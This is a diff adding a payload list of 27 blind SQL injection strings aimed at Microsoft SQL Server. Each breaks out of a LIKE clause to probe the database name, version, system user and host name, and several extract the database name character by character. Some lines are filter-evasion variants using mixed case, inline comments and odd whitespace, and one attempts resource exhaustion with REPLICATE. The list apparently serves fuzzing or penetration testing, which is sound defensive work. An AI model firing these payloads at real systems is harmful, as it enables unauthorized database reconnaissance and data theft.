@@ -1,0 +1,27 @@
+%' AND LEN(DB_NAME())>0 AND 'a'='a
+%' AND LEN(@@VERSION)>0 AND 'a'='a
+%' AND LEN(SYSTEM_USER)>0 AND 'a'='a
+%' AND LEN(USER_NAME())>0 AND 'a'='a
+%' AND LEN(HOST_NAME())>0 AND 'a'='a
+%' AND LEN(DB_NAME())=1 AND 'a'='a
+%' AND LEN(DB_NAME())=2 AND 'a'='a
+%' AND LEN(DB_NAME())=3 AND 'a'='a
+%' AND LEN(DB_NAME())=4 AND 'a'='a
+%' AND LEN(DB_NAME())=5 AND 'a'='a
+%' AND LEN(DB_NAME())=6 AND 'a'='a
+%' AND LEN(DB_NAME())=7 AND 'a'='a
+%' AND LEN(DB_NAME())=8 AND 'a'='a
+%' AND SUBSTRING(DB_NAME(),1,1)='a' AND 'a'='a
+%' AND SUBSTRING(DB_NAME(),1,1)='b' AND 'a'='a
+%' AND SUBSTRING(DB_NAME(),1,1)='c' AND 'a'='a
+%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>77 AND 'a'='a
+%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>90 AND 'a'='a
+%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100 AND 'a'='a
+%' AND LEFT(DB_NAME(),1)='m' AND 'a'='a
+%' AND RIGHT(DB_NAME(),1)='b' AND 'a'='a
+%' AND CHARINDEX('m',DB_NAME())=1 AND 'a'='a
+%' AnD LeN(Db_NaMe())>0 AnD 'a'='a
+%' AND LEN(DB/**/NAME())>0 AND 'a'='a
+ %'AND LEN(DB_NAME())>0 AND'a'='a
+  %' AND LEN(	DB_NAME())>0 AND 'a'='a
+%' AND LEN(REPLICATE('A',5000000))>0 AND 'a'='a
